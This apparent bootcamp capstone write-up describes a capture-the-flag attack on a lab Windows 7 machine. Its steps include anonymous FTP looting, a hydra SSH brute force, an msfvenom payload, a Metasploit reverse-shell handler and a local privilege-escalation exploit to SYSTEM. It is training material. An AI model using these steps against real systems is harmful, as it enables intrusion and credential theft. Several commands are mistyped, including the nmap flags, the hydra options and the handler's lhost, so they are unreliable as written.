<h2>Coding Dojo Graduation Capstone (Penetration Test)</h2>
 <p align="center">
 
![IMG_4471](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/bf99d747-bb77-4e5b-b6fb-3d1e1ef98562)


 <h1>Table of Contents</h1>


 <h4>1.0 Penetration test report</h4>


 - 1.1 Objective
 - 1.2 Requirements

 <h4>2.0 Report-High level Summary </h4>

 - 2.0 Report Recommendations

 <h4>3.0 Report-Methodologies</h4>

 - 3.1 Report-Information Gathering
 - 3.2 Report-Enumeration
 - 3.3 Report-Pentration

 <h2>1.0 Penetration Test Report</h2>

<h4>1.1 Objective</h4>
The objective of the belt exam is to successfully capture two flags from a vulnerable machine created
specifically for this exam. A reverse shell must also be obtained with either user or root-level access.

<h4>1.2 Requirements</h4>
Submit two correct flags
Must be able to follow and replicate
Include copy/paste commands
Get user and or root-level shells

<h4>2.0 Report-High-Level Summary</h4>
  
As a penetration tester, capture the flag machines are a good way to test our skills and discover new
vulnerabilities. This pen test CTF runs on Microsoft Windows 7 SP1 with multiple ports open, which is a
major red flag. Using an outdated OS with outdated services running on open ports makes this machine
an easy target.

During my investigation of the machine, I found multiple breadcrumbs, which lead me to different
services and programs for further enumeration and exploitation. Eventually, I was able to obtain three
flags and the final flag being the black belt flag which I obtained from a reverse shell with NT
Authority/System level access.

<h4>2.1 Report - Recommendations</h4>
I recommend that the operating system be upgraded to the latest service pack and take extra steps to
harden the system, such as establishing a proper firewall and creating stronger passwords. 

<h4>3.0 Methodologies</h4>
I started with basic active reconnaissance to gather as much information about the machine and its
vulnerabilities. Then I could enumerate each vulnerability and gather more information until I find
root/user credentials.

<h4>3.1 Information Gathering</h4>
With kali linux and the windows machine both running, I first need to find the IP address of the windows
machine. Using the command ifconfig I can get the ip of the host machine [10.0.2.16] and then use
the command nmap -Sn 10.0.2.1-254 to find the victim IP

<h4>3.2 Report - Service Enumeration</h4>
Starting with a Nmap scan of the machine, the first thing i noticed is that port 21 (FTP) allows anonvmous
login. nmap -SC -SV [Victim IP]


![IMG_4445](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/94d64f25-3fe1-4029-a2ec-ae46e0968879)

<h4>3.3 Penetration</h4>
I attempted to login into FTP anonymously, which was a success, and i discovered a single file called "all_passwords.txt"

ftp [victim ip]

ls

get all passwords.txt

bye

cat all passwords.txt

![IMG_4448](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/5d7b7535-996c-4dc4-a766-8ea6fc3169a3)

I HAVE BEEN TROLLED!

![IMG_4448 2](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/a9b256d7-fa46-4fd0-ad8d-e6d1afccbddb)

Testing the ftp for privileges shows that only read permissions are available so im out of luck with this one.

Moving onto port 80 to check out the website mentioned in the text file, I find a single page with an image and some text that says, "looks more like a bridge than a flag." To do this, I opened a web browser and navigated to the victim IP, 10.0.2.20.

![IMG_4450](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/2d27f1b3-46f4-4d8e-b6d4-d7c6e622fb03)


Viewing the page source reveals that the image alt savs "matthew." which could be a username or password. I also downloaded the image file and loaded it into stegcracker to see if anything was hidden in the image, which outputted a hidden message to a file

Stegcracker picl.jpg

![IMG_4450 2](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/4075aa12-9496-4b92-95e4-34f911398878)

The hidden message clearlv states a password with a hint that the username is also in the doc. I noticed some grammar mistakes that were placed there on purpose. The word ROlten password would lead me to believe that the password is ROT13 encoded, and if vou look verticallv down the side of the document, you can see in all caps that the hidden username is MATT. Using a simple ROT13 decoder on the scrambled password that was given reveals the true password to be "cybersecrocks".


![IMG_4452](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/dc5060c8-3d98-485f-bb5b-23e4457eb89b)


Back to the FTP login, I can try the credentials obtained from the doc, which grants me access and reveals the ftpflag.txt

ftp 10.0.2.20

ls

get ftpflag.txt

bye

cat ftpflag. txt


![IMG_4454](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/10c9006e-231f-4b60-9ac7-7d0127c3853a)
![IMG_4454 2](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/486d66d6-d88b-4c2d-b44e-6facbec18bd9)

Next, i logged back into FTP and grabbed the sensitiveinfo.pcap file from FTP using binary and loaded it into wireshark.

Binary

Get sensitiveinfo.pcap

bye





After digging in the pcap file on Wireshark, I came across a text string that revealed another hidden
message that was used in an outgoing emall. Instead of using a filter to find this string, i accidentallv
found it. To do this, I quickly scrolled each trame from the top until I hit frame 27, which showed a
message In the hex.

With that frame highlighted, I then pressed ctrl+alt+shift+T to follow the TCP stream, which will bring up
a window that shows the full message.

![IMG_4456](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/6464a4d5-f171-4ef9-a87b-5d34852bd569)



port 23 is telnet which i will attempt to log into with the credentials hahaha:haha
![IMG_4457](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/2adf27e1-dcbd-4e4b-8abc-a62b187b7656)


After logging into telnet i was able to grab the bonus flag.
![IMG_4680](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/5490b80c-db30-4c43-8320-d0fa02e69243)


Going back to Wireshark and searching through the remaining packets, i found another outgoing email that will lead me to an ssh account with the name being richmond and a hint as to how i could use a bruteforce attack for the password.
![IMG_4457 2](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/2b57fa5a-8039-4e06-ad8c-b637a23b3ee2)



Using hydra and the rockyou.txt wordlist, I could perform a brute-force attack on the ssh service with the username richmond.

The brute-force attack was successtul and returned the credentials as richmond:password

hydra -l richmond -e n -p /usr/share/wordlists/rockyou.txt10.0.2.20
ssh

![IMG_4681](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/85bcc513-0b55-4581-a5be-18d2f1be3abe)


Now I was able to log into ssh using the username and password.
ssh richmond@10.0.2.20
password

After logging into ssh, I could ls to view many files and directories.

![IMG_4682](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/5ad3f2fe-9949-4dfb-8165-14ca2c487474)




There is another text docment that i can read which gives me information on how to obtain the red belt and black belt.

Type noteToRichmond.txt

![IMG_4461](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/90c88e37-4833-4883-aeb8-099a23b54dc8)



Next, i will open a new terminal and craft a payload with msfvenom to be sent and executed on the machine for a reverse shell.

![IMG_4683](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/042b0525-e5a8-4de2-848d-fd5403041c93)



After the payload has been created, i can send it over to the machine via ssh using the following command.

scp givemethebelt.exe richmond@10.0.2.20:
password

![IMG_4685](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/92350349-ff83-43b3-ae44-5008b8e28044)



I can confirm that the pavload was successfully transferred by going back to my other terminal with the active ssh session and typing ls.
Now that I have confirmed the payload is on the machine, I can start my reverse TCP handler in Metasploit.

Msfconsole

Use exploit/multi/handler

Set payload generic/shell reverse_tcp

Set lhost 10.0.2.20

Set lport 4445

run



![IMG_4462](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/8fd11aa2-6211-4eaf-be79-674f071ef6d3)



Back on the ssh session, i remotely execute the payload by typing the file name and pressing and enter.


![IMG_4686](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/d13edffd-b401-4596-8150-9ba414507490)



BOOM! The Metasploit reverse handler responded with a functioning meterpreter.


![IMG_4686 2](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/1b478b57-22b2-4cfe-bf47-35e8e8ba0eb2)


[RED BELT UNLOCKED].



To get the black belt flag, there is another clue leading me to an XML file with a base64 encoded password inside. Now I could follow that next set of breadcrumbs leading me further down the rabbit hole, or I can take the easv route and use Metasploit to find a vulnerabilitv against mv current meterpreter session. To do this, I'm going to start by backgrounding my session so it is still active but can be recalled
whenever I want.

Background

![IMG_4465](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/3e1fbcf2-963b-4655-a618-f741b51e21c9)




Next, I will use the exploit suggester and set my session to one I just placed in the
background.

Use post/multi/recon/local exploit_suggester
Type sessions to find the session number
Set session 2
Run


The list returns nine potential vulnerabilities and five of which are validated, so i will be testing those five.


![IMG_4465 2](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/a65af12f-e164-4bb5-9d01-3ef62054f085)


After testing four of the five validated exploits on the list, ntusermndragover was the lucky winner.

Use exploit/window/local/ntusermndragover
set session 2
run


![IMG_4466](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/c6439501-dbcc-4fe1-8230-03ac8fa5de97)



Privilege escalation has been accomplished, and i now have NT AUTHORITY\SYSTEM access.



![IMG_4466 2](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/14585d72-aeff-4950-8ad8-f80ba8911a2f)



Typing out shell will give me a working cmd shell, and now i can navigate to C:/Users/IEUSers/Desktop, where the flag will be located.


![IMG_4467](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/1090aef4-d0bd-4c2f-b94a-a47557a1ec29)



![IMG_4687](https://github.com/DionAlexander1/Ethical-Hacking-Lab-Final-Exam/assets/105241007/dc80e6cb-f905-4d1f-95f8-981b8259b689)


[BLACK BELT UNLOCKED].


## Conclusion

Performing my first official penetration test after just six months in the cybersecurity field was undoubtedly the most challenging endeavor I have faced thus far. I must admit, it was intimidating, even for someone like me who does not scare easily. However, rather than deter me, the experience further intrigued me about this field. It made me realize the importance of humbling myself and embracing lifelong learning to succeed in cybersecurity.
Initially, I encountered some difficulties in locating the black flag, and I sought assistance from my professor. On a positive note, capturing the red flag marked the point of qualification for graduation, and I could have stopped the examination at that point. However, I couldn't shake the feeling of dissatisfaction for not finding the black flag within the allocated time. Therefore, even though I missed the grading criteria to officially obtain the black flag, I decided to go back and complete the test to the best of my abilities. I believe that this dedication is how I want to start my new career, giving it my all.
Post examination, I recognized that there are areas I need to improve, such as the process of cleaning house, which involves eradicating all traces of the penetration test. I inadvertently left fragments of evidence, tools, and user accounts, and failed to clean log files properly, potentially creating difficulties for organizations in the future. I have come to realize that as a Pentester, due dilligence is crucial in ensuring no remnants are left behind after the completion of a penetration test. My professer made sure to let me know the importance of this post examination and i couldnt agree more.

Lastly, despite the challenges faced during this project, it has only deepened my passion for cybersecurity. I am committed to honing my skills and knowledge, so I can contribute meaningfully to the field and better protect organizations from potential threats. I look forward to honing my skills further defensively and into the cloud moving forwarding and then later in my career i plan on developing my offensive skills even further because you cant defend what you dont know! So to anyone out there feeling overwhelmed, just dont give up.
